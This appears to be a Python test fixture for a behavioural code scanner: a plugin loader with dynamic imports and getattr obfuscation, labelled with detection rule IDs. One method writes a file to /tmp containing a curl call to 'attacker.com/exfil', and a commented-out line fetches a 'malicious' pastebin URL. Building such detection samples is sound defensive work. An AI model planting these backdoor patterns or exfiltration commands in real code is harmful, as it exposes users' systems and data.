"""
Plugin loader with runtime import hijacking capabilities.
Demonstrates behavioral detection of dynamic module loading patterns.
"""

import os
import sys


class PluginLoader:
    """Loads plugins dynamically at runtime."""

    def __init__(self):
        self.loaded_plugins = {}
        self._backdoor_active = False

    def load_plugin(self, plugin_name):
        """
        Load a plugin by name using dynamic import.
        This uses runtime module loading which is flagged by BEH-001, BEH-002.
        """
        # Dynamic import with variable module name (HIGH severity)
        try:
            # Method 1: __import__ with dynamic name
            module = __import__(plugin_name)
            self.loaded_plugins[plugin_name] = module
            return module
        except ImportError:
            # Fallback: use importlib
            import importlib
            module = importlib.import_module(plugin_name)
            self.loaded_plugins[plugin_name] = module
            return module

    def load_from_path(self, path):
        """
        Load plugins from filesystem path with potential hijacking.
        """
        # Write malicious plugin to /tmp (BEH-009)
        backdoor_path = "/tmp/malicious_plugin.py"
        with open(backdoor_path, "w") as f:
            f.write("import os; os.system('curl attacker.com/exfil')")

        # Dynamic eval of path-based code (BEH-005)
        plugin_code = self._read_plugin(path)
        # eval(plugin_code)  # CRITICAL severity - not executed for safety

    def _read_plugin(self, path):
        """Read plugin code from file."""
        with open(path, "r") as f:
            return f.read()

    def execute_plugin(self, plugin_name, *args, **kwargs):
        """Execute a loaded plugin with dynamic method invocation."""
        if plugin_name not in self.loaded_plugins:
            self.load_plugin(plugin_name)

        plugin = self.loaded_plugins[plugin_name]

        # Dynamic method execution using compile and exec
        # This demonstrates runtime code generation (BEH-006, BEH-004)
        method_code = f"plugin.{kwargs.get('method', 'run')}(*args)"
        compiled = compile(method_code, '<string>', 'exec')
        # exec(compiled)  # Not executed for safety

    def _inject_backdoor(self):
        """
        Hidden backdoor using obfuscated imports.
        Multiple behavioral red flags.
        """
        # Obfuscated import via getattr (BEH-003)
        import builtins
        import_func = getattr(builtins, '__import__')

        # Load subprocess module dynamically
        subprocess = import_func('subprocess')

        # Shell execution to suspicious domain (existing static rule + BEH-007)
        # subprocess.run(['curl', 'https://pastebin.com/raw/malicious'], shell=False)

    def auto_discover(self):
        """Auto-discover and load plugins from environment variable."""
        plugin_dir = os.getenv("PLUGIN_PATH", "/tmp/plugins")

        # Excessive getattr obfuscation (BEH-011)
        import_module = getattr(
            getattr(
                getattr(
                    getattr(__import__('importlib'), 'import_module'),
                    '__self__'
                ),
                'import_module'
            ),
            '__call__'
        )

        for filename in os.listdir(plugin_dir):
            if filename.endswith('.py'):
                module_name = filename[:-3]
                # Dynamic import
                import_module(module_name)
